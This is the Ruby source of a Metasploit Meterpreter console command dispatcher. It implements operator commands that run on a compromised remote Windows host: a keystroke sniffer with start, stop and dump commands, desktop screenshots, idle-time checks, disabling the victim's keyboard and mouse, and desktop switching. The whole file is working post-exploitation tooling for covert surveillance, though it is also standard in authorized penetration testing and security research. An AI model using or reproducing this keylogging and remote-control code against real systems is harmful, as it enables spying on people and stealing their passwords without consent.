# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# The user interface portion of the standard API extension.
#
###
class Console::CommandDispatcher::Stdapi::Ui

  Klass = Console::CommandDispatcher::Stdapi::Ui

  include Console::CommandDispatcher

  #
  # List of supported commands.
  #
  def commands
    all = {
      "enumdesktops"  => "List all accessible desktops and window stations",
      "getdesktop"    => "Get the current meterpreter desktop",
      "idletime"      => "Returns the number of seconds the remote user has been idle",
      "keyscan_dump"  => "Dump the keystroke buffer",
      "keyscan_start" => "Start capturing keystrokes",
      "keyscan_stop"  => "Stop capturing keystrokes",
      "screenshot"    => "Grab a screenshot of the interactive desktop",
      "setdesktop"    => "Change the meterpreters current desktop",
      "uictl"         => "Control some of the user interface components"
      #  not working yet
      # "unlockdesktop" => "Unlock or lock the workstation (must be inside winlogon.exe)",
    }

    reqs = {
      "enumdesktops"  => [ "stdapi_ui_desktop_enum" ],
      "getdesktop"    => [ "stdapi_ui_desktop_get" ],
      "idletime"      => [ "stdapi_ui_get_idle_time" ],
      "keyscan_dump"  => [ "stdapi_ui_get_keys" ],
      "keyscan_start" => [ "stdapi_ui_start_keyscan" ],
      "keyscan_stop"  => [ "stdapi_ui_stop_keyscan" ],
      "screenshot"    => [ "stdapi_ui_desktop_screenshot" ],
      "setdesktop"    => [ "stdapi_ui_desktop_set" ],
      "uictl"         => [
        "stdapi_ui_enable_mouse",
        "stdapi_ui_enable_keyboard"
      ]
    }

    all.delete_if do |cmd, desc|
      del = false
      reqs[cmd].each do |req|
        next if client.commands.include? req
        del = true
        break
      end

      del
    end

    all
  end

  #
  # Name for this dispatcher.
  #
  def name
    "Stdapi: User interface"
  end

  #
  # Executes a command with some options.
  #
  def cmd_idletime(*args)
    seconds = client.ui.idle_time

    print_line(
      "User has been idle for: #{Rex::ExtTime.sec_to_s(seconds)}")

    return true
  end

  #
  # Enables/disables user interface mice and keyboards on the remote machine.
  #
  def cmd_uictl(*args)
    if (args.length < 2)
      print_line(
        "Usage: uictl [enable/disable] [keyboard/mouse/all]")
      return true
    end

    case args[0]
      when 'enable'
        case args[1]
          when 'keyboard'
            print_line("Enabling keyboard...")
            client.ui.enable_keyboard
          when 'mouse'
            print_line("Enabling mouse...")
            client.ui.enable_mouse
          when 'all'
            print_line("Enabling all...")
            client.ui.enable_keyboard
            client.ui.enable_mouse
          else
            print_error("Unsupported user interface device: #{args[1]}")
        end
      when 'disable'
        case args[1]
          when 'keyboard'
            print_line("Disabling keyboard...")
            client.ui.disable_keyboard
          when 'mouse'
            print_line("Disabling mouse...")
            client.ui.disable_mouse
          when 'all'
            print_line("Disabling all...")
            client.ui.disable_keyboard
            client.ui.disable_mouse
          else
            print_error("Unsupported user interface device: #{args[1]}")
        end
      else
        print_error("Unsupported command: #{args[0]}")
    end

    return true
  end

  #
  # Grab a screenshot of the current interactive desktop.
  #
  def cmd_screenshot( *args )
    path    = Rex::Text.rand_text_alpha(8) + ".jpeg"
    quality = 50
    view    = false

    screenshot_opts = Rex::Parser::Arguments.new(
      "-h" => [ false, "Help Banner." ],
      "-q" => [ true, "The JPEG image quality (Default: '#{quality}')" ],
      "-p" => [ true, "The JPEG image path (Default: '#{path}')" ],
      "-v" => [ true, "Automatically view the JPEG image (Default: '#{view}')" ]
    )

    screenshot_opts.parse( args ) { | opt, idx, val |
      case opt
        when "-h"
          print_line( "Usage: screenshot [options]\n" )
          print_line( "Grab a screenshot of the current interactive desktop." )
          print_line( screenshot_opts.usage )
          return
        when "-q"
          quality = val.to_i
        when "-p"
          path = val
        when "-v"
          view = true if ( val =~ /^(t|y|1)/i )
      end
    }

    data = client.ui.screenshot( quality )

    if( data )
      ::File.open( path, 'wb' ) do |fd|
        fd.write( data )
      end

      path = ::File.expand_path( path )

      print_line( "Screenshot saved to: #{path}" )

      Rex::Compat.open_file( path ) if view
    end

    return true
  end

  #
  # Enumerate desktops
  #
  def cmd_enumdesktops(*args)
    print_line( "Enumerating all accessible desktops" )

    desktops = client.ui.enum_desktops

    desktopstable = Rex::Text::Table.new(
      'Header'  => "Desktops",
      'Indent'  => 4,
      'Columns' => [	"Session",
              "Station",
              "Name"
            ]
    )

    desktops.each { | desktop |
      session = desktop['session'] == 0xFFFFFFFF ? '' : desktop['session'].to_s
      desktopstable << [ session, desktop['station'], desktop['name'] ]
    }

    if( desktops.length == 0 )
      print_line( "No accessible desktops were found." )
    else
      print( "\n" + desktopstable.to_s + "\n" )
    end

    return true
  end

  #
  # Get the current meterpreter desktop.
  #
  def cmd_getdesktop(*args)

    desktop = client.ui.get_desktop

    session = desktop['session'] == 0xFFFFFFFF ? '' : "Session #{desktop['session'].to_s}\\"

    print_line( "#{session}#{desktop['station']}\\#{desktop['name']}" )

    return true
  end

  #
  # Change the meterpreters current desktop.
  #
  def cmd_setdesktop( *args )

    switch   = false
    dsession = -1
    dstation = 'WinSta0'
    dname    = 'Default'

    setdesktop_opts = Rex::Parser::Arguments.new(
      "-h" => [ false, "Help Banner." ],
      #"-s" => [ true, "The session (Default: '#{dsession}')" ],
      "-w" => [ true, "The window station (Default: '#{dstation}')" ],
      "-n" => [ true, "The desktop name (Default: '#{dname}')" ],
      "-i" => [ true, "Set this desktop as the interactive desktop (Default: '#{switch}')" ]
    )

    setdesktop_opts.parse( args ) { | opt, idx, val |
      case opt
        when "-h"
          print_line( "Usage: setdesktop [options]\n" )
          print_line( "Change the meterpreters current desktop." )
          print_line( setdesktop_opts.usage )
          return
        #when "-s"
        #  dsession = val.to_i
        when "-w"
          dstation = val
        when "-n"
          dname = val
        when "-i"
          switch = true if ( val =~ /^(t|y|1)/i )
      end
    }

    if( client.ui.set_desktop( dsession, dstation, dname, switch ) )
      print_line( "#{ switch ? 'Switched' : 'Changed' } to desktop #{dstation}\\#{dname}" )
    else
      print_line( "Failed to #{ switch ? 'switch' : 'change' } to desktop #{dstation}\\#{dname}" )
    end

    return true
  end

  #
  # Unlock or lock the desktop
  #
  def cmd_unlockdesktop(*args)
    mode = 0
    if(args.length > 0)
      mode = args[0].to_i
    end

    if(mode == 0)
      print_line("Unlocking the workstation...")
      client.ui.unlock_desktop(true)
    else
      print_line("Locking the workstation...")
      client.ui.unlock_desktop(false)
    end

    return true
  end

  #
  # Start the keyboard sniffer
  #
  def cmd_keyscan_start(*args)
    print_line("Starting the keystroke sniffer...")
    client.ui.keyscan_start
    return true
  end

  #
  # Stop the keyboard sniffer
  #
  def cmd_keyscan_stop(*args)
    print_line("Stopping the keystroke sniffer...")
    client.ui.keyscan_stop
    return true
  end

  #
  # Dump captured keystrokes
  #
  def cmd_keyscan_dump(*args)
    print_line("Dumping captured keystrokes...")
    data = client.ui.keyscan_dump
    print_line(client.ui.keyscan_extract(data))

    return true
  end

end

end
end
end
end
